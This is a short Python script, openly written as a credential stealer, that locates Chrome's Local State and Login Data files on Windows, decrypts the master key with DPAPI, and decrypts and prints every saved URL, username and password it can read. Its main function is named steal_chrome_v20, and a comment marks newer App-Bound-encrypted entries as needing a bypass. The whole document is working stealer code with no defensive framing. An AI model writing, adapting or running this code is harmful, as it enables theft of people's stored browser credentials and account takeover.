import os
import json
import base64
import sqlite3
import shutil
import win32crypt # pip install pypiwin32
from Cryptodome.Cipher import AES # pip install pycryptodome

def get_master_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    # Decode the base64 encrypted key
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # Remove DPAPI prefix (first 5 bytes)
    encrypted_key = encrypted_key[5:]
    # Decrypt the master key using DPAPI
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_v10(password, key):
    try:
        iv = password[3:15]
        payload = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except:
        return "[Error Decrypting v10]"

def steal_chrome_v20():
    key = get_master_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename) # Copy to avoid "Database locked" error

    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    
    print(f"{'URL':<50} | {'Username':<20} | {'Password'}")
    print("-" * 100)

    for url, user, password in cursor.fetchall():
        if password.startswith(b'v10'):
            decrypted_pass = decrypt_v10(password, key)
        elif password.startswith(b'v20'):
            # This is the new App-Bound Encryption
            decrypted_pass = "[v20 Encrypted - Requires Bypass]"
        else:
            # Very old legacy DPAPI
            decrypted_pass = win32crypt.CryptUnprotectData(password, None, None, None, 0)[1].decode()

        print(f"{url:<50} | {user:<20} | {decrypted_pass}")

    cursor.close()
    db.close()
    os.remove(filename)

if __name__ == "__main__":
    steal_chrome_v20()
